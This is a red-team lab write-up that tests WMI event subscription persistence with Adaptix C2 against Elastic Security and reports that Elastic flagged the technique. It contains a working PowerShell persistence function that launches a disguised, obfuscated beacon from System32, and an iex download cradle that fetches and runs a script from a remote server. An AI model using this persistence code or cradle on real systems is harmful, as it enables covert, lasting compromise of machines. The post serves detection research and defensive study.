---
cover: ../.gitbook/assets/WMI Persistence Flow Diagram.png
coverY: 0
---

# WMI Persistence vs Elastic: One Alert Was All It Took

Hey everyone, This is Akchhat here and welcome to this blog. Since I was Researching over Various Persistence Techniques and WMI based persistence gets talked about a lot as a quiet, fileless way to maintain access on a compromised host, so I wanted to run it myself against a real EDR and see if that reputation still holds up. I tested this in my home AD lab using Adaptix C2 on the operator side and Elastic Security as the detection stack on the defender side, starting from an assumption that I already had a SYSTEM level beacon on the target.

## Lab Setup :&#x20;

* My lab for this was `marvel.local`, running on VMware Workstation, two Windows 10 machines and a Windows Server 2019 acting as the DC, with Elastic Security deployed across the domain. Nothing turned off, nothing bypassed in advance, since the point was to see where the technique held up and where it didn’t.
* on the C2 Side, I used Adaptix C2 as I have been using Adaptix for a while now and find it convenient honestly.

## What is WMI Event Subscription Persistence?

* Windows Management Instrumentation lets you register a permanent event subscription that survives reboots without touching the registry run keys, services, or scheduled tasks most defenders watch first. The subscription has three parts: an `__EventFilter` that defines what you’re watching for via a WQL query, an `EventConsumer` that defines what to do when the filter matches, and a `__FilterToConsumerBinding` that ties the two together.
* Once bound, the WMI provider host takes care of everything. There is no dropped scheduled task, no new service or no registry run key. That’s the pitch, and it’s why I wanted to see how it holds up against something that’s actually watching WMI activity rather than just the usual persistence locations.

## The Attack Chain :&#x20;

* Here we assume that we already have a beacon running as `System`  and I used **Adaptix C2** for this, with a listener named `operator`. I generated an agent, set the output format to exe, and named the payload `windowsdebugger.exe` to blend into `System32`. I ran it through a basic binary obfuscation pass before staging it.

<figure><img src="../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

* Now On the attacker side I hosted everything off a simple Python server:

```
python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
```

* This served the agent along with my persistence script, `persist.ps1` which I created and the core of this script is a function, `Add-WmiPersistence`, that sets up the filter, the consumer, and the binding:

```
function Add-WmiPersistence
{
    $EventFilterArgs = @{
        EventNamespace = 'root/cimv2'
        Name = "Debugger"
        Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '1502'"
        QueryLanguage = 'WQL'
    }
    $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

    $CommandLineConsumerArgs = @{
        Name = "Debugger"
        CommandLineTemplate = "C:\Windows\System32\windowsdebugger.exe -trace"
    }
    $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

    $FilterToConsumerArgs = @{
        Filter = $Filter
        Consumer = $Consumer
    }
    Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
}
```

* The filter watches `root/cimv2` for Event ID `1502` on `Win32_NTLogEvent`, which fires whenever Group Policy finishes processing. That’s a reliable, frequent trigger, which made it a good choice for testing without waiting on a full reboot cycle.
* The consumer is a `CommandLineEventConsumer` set to launch `windowsdebugger.exe -trace` straight out of `System32` whenever the filter matches.
* I also wrote a `Remove-WmiPersistence` function alongside it for cleanup, pulling the filter, consumer, and binding back out by name.
* Now on the victim side, we downloaded the `windowsdebugger.exe` binary which was a stageless payload with binary obfuscation and then we move this to `C:\Windows\system32\` directory

<figure><img src="../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

* Now on the attacker side, since we had a beacon running as `system` , I used a standard download cradle to pull `persist.ps1` into memory and immediately call the function

<figure><img src="../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>

* The job came back with the `__FilterToConsumerBinding` object, confirming the subscription was live on `THEPUNISHER` under `ROOT\subscription`.

```
[30/10 09:22:56] server [90ab495f] beacon > powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.233.128:8081/persist.ps1') ; Add-WmiPersistence
[30/10 09:22:56] [*] Task: create new process
[30/10 09:23:01] [*] Agent called server, sent [193 bytes]
[30/10 09:23:01] [+] Program C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c iex (New-Object Net.WebClient).DownloadString('http://192.168.233.128:8081/persist.ps1') ; Add-WmiPersistence started with PID 720 (output - with output)
[30/10 09:23:06] [+] Job [90ab495f] output:


__GENUS                 : 2
__CLASS                 : __FilterToConsumerBinding
__SUPERCLASS            : __IndicationRelated
__DYNASTY               : __SystemClass
__RELPATH               : __FilterToConsumerBinding.Consumer="CommandLineEventConsumer.Name=\"Debugger\"",Filter="__Eve
                          ntFilter.Name=\"Debugger\""
__PROPERTY_COUNT        : 7
__DERIVATION            : {__IndicationRelated, __SystemClass}
__SERVER                : THEPUNISHER
__NAMESPACE             : ROOT\subscription
__PATH                  : \\THEPUNISHER\ROOT\subscription:__FilterToConsumerBinding.Consumer="CommandLineEventConsumer.
                          Name=\"Debugger\"",Filter="__EventFilter.Name=\"Debugger\""
Consumer                : CommandLineEventConsumer.Name="Debugger"
CreatorSID              : {1, 1, 0, 0...}
DeliverSynchronously    : False
DeliveryQoS             : 
Filter                  : __EventFilter.Name="Debugger"
MaintainSecurityContext : False
SlowDownProviders       : False
PSComputerName          : THEPUNISHER
[30/10 09:23:06] [+] Job [90ab495f] finished
```

* Now Rather than wait for a natural reboot, I forced the trigger condition directly

<figure><img src="../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

* This processes Group Policy and logs Event ID `1502`, which is exactly what the filter was watching for. A few seconds after the policy update completed, a new beacon checked in on Adaptix as `windowsdebugger.exe`, confirming the WMI consumer fired and launched the payload without me touching the box again.

<figure><img src="../.gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>

## Detection :&#x20;

* This is the part that mattered most. Over on the Elastic Security side, the subscription being created triggered a medium severity alert: **“Suspicious WMI Event Subscription Created.”** Elastic mapped it directly to MITRE ATT\&CK **T1546.003 Event Triggered Execution: WMI Event Subscription**.

<figure><img src="../.gitbook/assets/image (172).png" alt=""><figcaption></figcaption></figure>

* The Analyzer graph reconstructed the execution chain the WMI provider used to launch the consumer, tracing down through the process tree to the PowerShell execution and the resulting process it spawned.

<figure><img src="../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

* So the subscription itself got flagged the moment it was created, not after the consumer ran. That’s the key detail. Elastic didn’t need to catch the beacon’s traffic or its behavior on execution, it caught the act of registering the `__FilterToConsumerBinding` in the first place.
* The detection that actually fired was tied to `T1546.003`, which makes sense since that’s the technique that leaves the most durable, most queryable artifact: the `__FilterToConsumerBinding` object itself, sitting in `ROOT\subscription` for as long as it’s live.

## Key Takeaways :&#x20;

* WMI event subscription persistence still works exactly as advertised from a functionality standpoint. With no scheduled task, no service or no run key, and it survives reboots cleanly through a legitimate Windows mechanism. But “no file-based footprint” doesn’t mean “invisible,” and that distinction matters more than the technique’s reputation suggests.
* Against Elastic with detection rules in place, the subscription creation alone was enough to generate an alert and get mapped to a specific ATT\&CK technique within seconds. In a monitored environment, that’s a loud move dressed up as a quiet one.
* My conclusion from this test: **WMI based persistence is not an OPSEC safe choice against a modern EDR stack that’s watching WMI activity, which most mature stacks are at this point**. It’s still useful to know and still has a place, but it shouldn’t be the default persistence mechanism in an engagement where the blue team has reasonable WMI telemetry turned on.

## What I’m Working On Next :&#x20;

* I want to test whether modifying the filter’s query structure or using a less commonly watched event ID changes detection outcomes, and whether a different consumer type (ActiveScriptEventConsumer vs CommandLineEventConsumer) gets treated differently by the same ruleset. That’ll be a follow up post once I’ve run it properly.
